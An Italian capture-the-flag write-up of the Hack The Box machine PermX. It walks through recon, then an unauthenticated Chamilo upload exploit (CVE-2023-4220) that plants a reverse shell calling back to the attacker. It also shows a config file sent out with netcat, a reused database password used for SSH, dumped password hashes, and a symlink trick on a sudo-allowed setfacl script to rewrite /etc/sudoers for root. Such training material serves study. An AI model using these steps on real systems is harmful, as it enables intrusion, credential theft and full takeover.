**Target: 10.10.11.23**

# INFORMATION GHATERING

Iniziamo con un semplice scan di [Nmap](Note/Tool/Nmap.md)
```bash
kali@kali ~/htb/permx
❯ sudo nmap -sT 10.10.11.23
[sudo] password for kali:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-12 21:37 CEST
Nmap scan report for 10.10.11.23
Host is up (0.037s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.91 seconds


kali@kali ~/htb/permx
❯ sudo nmap -sSVC -p 22,80  10.10.11.23
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-12 21:47 CEST
Nmap scan report for 10.10.11.23
Host is up (0.038s latency).

PORT   STATE  SERVICE  VERSION
22/tcp open   ssh
80/tcp open   http     Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.0.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.93 seconds
```


abbiamo  2 porte aperte:

- 22 ssh
- 80 http  Apache httpd 2.4.52 

abbiamo un redirect a `http://permx.htb` che andremo ad aggiungerlo al nostro `/etc/hosts`
prima di visitare la porta 80

```bash
kali@kali ~/htb/permx 9s
❯ sudo echo '10.10.11.23 permx.htb' | sudo tee -a /etc/hosts
10.10.11.23 permx.htb
```

un ulteriore scan su tutte le porte non ci porta nessuna nuova informazione

# ENUMERATION

visitando la porta 80 ci troviamo davanti ad un sito di elearing
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/permx.png)

Sul sito sembra non esserci nulla d'interessante proviamo a cercare se abbiamo qualche VHOST

```bash
kali@kali ~/htb/permx
❯ ffuf -u http://permx.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host:FUZZ.permx.htb" -fc 302

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302
________________________________________________

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 770ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 70ms]
```

Ne troviamo 2 `www` e `lms` che andremo sempre ad aggiungere sempre al nostro `etc/hosts`

Se visitiamo `lms.permx.htb` ci troviamo davanti ad un form di login di Chamilo
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/permx2.png)
da notare in basso a destra abbiamo la seguente dicitura `Administrator: Davis Miller`
potrebbe essere l'amministratore del sito tiamo a mente.

continuiamo ad enumerare con con dirsearch per vedere se troviamo possibili informazioni esposte.

```bash
kali@kali ~/htb/permx
❯ dirsearch -u http://lms.permx.htb
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/htb/permx/reports/http_lms.permx.htb/_24-08-12_22-17-54.txt

Target: http://lms.permx.htb/

[22:17:54] Starting:
[22:17:59] 200 -   46B  - /.bowerrc
[22:18:00] 200 -    2KB - /.codeclimate.yml
[22:18:04] 403 -  278B  - /.ht_wsr.txt
[22:18:04] 403 -  278B  - /.htaccess.bak1
[22:18:04] 403 -  278B  - /.htaccess.orig
[22:18:05] 403 -  278B  - /.htaccess.sample
[22:18:05] 403 -  278B  - /.htaccess_orig
[22:18:05] 403 -  278B  - /.htaccess.save
[22:18:05] 403 -  278B  - /.htaccess_sc
[22:18:05] 403 -  278B  - /.htaccess_extra
[22:18:05] 403 -  278B  - /.htaccessBAK
[22:18:05] 403 -  278B  - /.htaccessOLD
[22:18:05] 403 -  278B  - /.htaccessOLD2
[22:18:05] 403 -  278B  - /.htm
[22:18:05] 403 -  278B  - /.htpasswd_test
[22:18:05] 403 -  278B  - /.html
[22:18:05] 403 -  278B  - /.httr-oauth
[22:18:05] 403 -  278B  - /.htpasswds
[22:18:09] 403 -  278B  - /.php
[22:18:11] 200 -    3KB - /.scrutinizer.yml
[22:18:13] 200 -    4KB - /.travis.yml
```

il file `.travis.yml` sempre interessante proviamo a scaricarlo e vedere cosa contiene.
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/permx3.png)
Sembra essere un file di configurazione. che ci fornisce la versione di Chamilio la `1.11.x`

# GAINING AN INITIAL FOOTHOLD 

Dopo una rapida ricerca per la versione di Chamilio troviamo [questa RCE](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc) relativa [alla CVE 2023-4220](https://pentest-tools.com/vulnerabilities-exploits/chamilo-lms-11124-remote-code-execution_22949))

Leggiamo che consente agli aggressori non autenticati di eseguire attacchi di scripting cross-site archiviati e ottenere codice remoto esecuzione tramite caricamento di una web shell all'endpoint `/main/inc/lib/javascript/bigupload/files/`.

Bene non ci resta che scaricare il tutto e testare

```bash
kali@kali ~/htb/permx
❯python3 main.py -u http://example.com/chamilo -a scan
[+] Target is likely vulnerable. Go ahead. [+]
```

Perfetto, ora l'exploit ci consente anche di avere una revshell pronta all'uso ma prima ci mettiamo in ascolto come sempre con [Netcat](Note/Tool/Netcat.md)
```bash
kali@kali ~/htb/permx
❯ nc -lnvp 1010
listening on [any] 1010 ...
```

Lanciamo l'exploit
```bash
kali@kali ~/htb/permx
❯python3 main.py -u http://lms.permx.htb -a revshell

Enter the name of the webshell file that will be placed on the target server (default: webshell.php): readme
Enter the name of the bash revshell file that will be placed on the target server (default: revshell.sh): readme
Enter the host the target server will connect to when the revshell is run: 10.10.14.49
Enter the port on the host the target server will connect to when the revshell is run: 1010
[!] BE SURE TO BE LISTENING ON THE PORT THAT YOU DEFINED [!]

[+] Execution completed [+]

You should already have a revserse connection by now.
```

e abbiamo la nostra shell
```bash
kali@kali ~/htb/permx
❯ nc -lnvp 1010
listening on [any] 1010 ...
connect to [10.10.14.49] from (UNKNOWN) [10.10.11.23] 37244
bash: cannot set terminal process group (1191): Inappropriate ioctl for device
bash: no job control in this shell
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$
```

## Manual 

Possiamo ottenere la nostra shell anche in maniera manuale

Leggendo la CVE scopriamo che il percorso vulnerabile è il seguente `/main/inc/lib/javascript/bigupload/inc/bigUpload.php` quindi quello che possiamo fare è carica con curl una revshell e richiamarla sempre con curl 

```bash
kali@kali ~/htb/permx
❯ curl -F 'bigUploadFile=@revers.php' 'http://lms.permx.htb//main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
The file has successfully been uploaded.%
```

ci mettiamo sempre in ascolto con nc

```bash
kali@kali ~/htb/permx
❯ nc -lnvp 443
listening on [any] 443 ...
```

e sempre con curl lo richiamiamo 
```bash
kali@kali ~/htb/permx
❯ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/revers.php'
```

otteniamo cosi la nostra shell

```bash
kali@kali ~/htb/permx
❯ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.49] from (UNKNOWN) [10.10.11.23] 40208
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

# www-data --> mtz

All'interno del percorso `/var/www/chamilo/app/config`  troviamo un file di configurazione.php, lo scarichiamo e vediamo cosa contiene.
```bash
www-data@permx:/var/www/chamilo/app/config$ nc 10.10.14.49 1010 < configuration.php
```

```bash
<?php
// Chamilo version 1.11.24
// File generated by /install/index.php script - Sat, 20 Jan 2024 18:20:32 +0000
/* For licensing terms, see /license.txt */
/**
 * This file contains a list of variables that can be modified by the campus site's server administrator.
 * Pay attention when changing these variables, some changes may cause Chamilo to stop working.
 * If you changed some settings and want to restore them, please have a look at
 * configuration.dist.php. That file is an exact copy of the config file at install time.
 * Besides the $_configuration, a $_settings array also exists, that
 * contains variables that can be changed and will not break the platform.
 * These optional settings are defined in the database, now
 * (table settings_current).
 */

// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;
```

Abbiamo delle credenziali per accedere al database lato localhost

`mysql -u chamilo -h 127.0.0.1 -p`

```bash
MariaDB [chamilo]> select username, password form user;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'user' at line 1
MariaDB [chamilo]> select username, password from user;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$04$1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra |
| anon     | $2y$04$wyjp2UVTeiD/jF4OdoYDquf4e7OWi6a3sohKRDe80IHAyihX0ujdS |
+----------+--------------------------------------------------------------+
2 rows in set (0.001 sec)
```

Mentre cerchiamo di rompere gli hash vediamo se abbiamo altri utenti su cui possiamo provare la password che abbiamo usato per accedere al database nel caso fosse stata riutilizzata 

usiamo  `cat /etc/passwd | grep -i sh$`  per vedere quali utenti hanno un shell bash

```bash
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ cat /etc/passwd | grep -i sh$
cat /etc/passwd | grep -i sh$
root:x:0:0:root:/root:/bin/bash
mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$
```

qui vediamo un utente di nome `mtz` proviamo ad usare la password trovata prima per collegarci in ssh 

```bash

kali@kali ~/htb/permx
❯ ssh mtz@10.10.11.23
mtz@10.10.11.23's password:
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Aug 14 04:01:42 PM UTC 2024

  System load:           0.02
  Usage of /:            60.7% of 7.19GB
  Memory usage:          25%
  Swap usage:            0%
  Processes:             303
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.23
  IPv6 address for eth0: dead:beef::250:56ff:fe94:2d1e


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Aug 14 15:35:01 2024 from 10.10.14.33
mtz@permx:~$
```

# PRIVESC

Vediamo se possiamo eseguire qualcosa come root
```bash
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

Vediamo di cosa si tratta 
```bash
mtz@permx:~$ cat /opt/acl.sh
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

Questo script Bash viene utilizzato per assegnare permessi a un utente specifico su un file utilizzando `setfacl`, che è uno strumento per gestire le liste di controllo degli accessi (ACL) su sistemi Unix/Linux.


Quello che faremo e la creazione di un collegamento simbolico (symlink)

```bash
mtz@permx:~$ ln -s /etc/sudoers /home/mtz/sudo
```

- Questo comando crea un collegamento simbolico chiamato `sudo` nella directory `/home/mtz/` che punta al file `/etc/sudoers`.
- Un collegamento simbolico è un file speciale che funge da riferimento o puntatore a un altro file o directory.

 Esecuzione dello Script `acl.sh` con `sudo`

```bash
mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/sudo
```

- Questo comando esegue lo script `acl.sh` come utente root (`sudo`), passando come parametri l'utente `mtz`, i permessi `rw` (lettura e scrittura), e il file `/home/mtz/sudo`.
- Come abbiamo visto in precedenza, lo script `acl.sh` controlla se il target è un file e se si trova nella directory `/home/mtz/`. Tuttavia, poiché abbio creato un symlink a `/etc/sudoers`, lo script concederà effettivamente permessi su questo file

```bash
# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "@include" directives:

@includedir /etc/sudoers.d
mtz ALL=(ALL:ALL) NOPASSWD: /opt/acl.sh

```

Quello che possiamo vedere è che effettivamente come utenti mtz possiamo eseguire solo `/optc/acl.sh` Ora dato che abbiamo i permessi di scrittura possiamo modificarlo. Quello che andremo a fare è sostituirlo a `NO PASSWD: `il valore `/opt/acl.sh` con `ALL` questo fare ci darà modo di eseguire qualsiasi comando come utente root senza inserire la password  

```bash
```bash
# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "@include" directives:

@includedir /etc/sudoers.d
mtz ALL=(ALL:ALL) NOPASSWD: ALL
```

eleviamo i nostri privilegi e ci prediamo la nostra root flag

```bash
mtz@permx:~$ sudo su
root@permx:/home/mtz# cat /root.txt
cat: /root.txt: No such file or directory
root@permx:/home/mtz# cat /root/root.txt
1916857023a2ccdea47a00f7f1cae55e
root@permx:/home/mtz#
```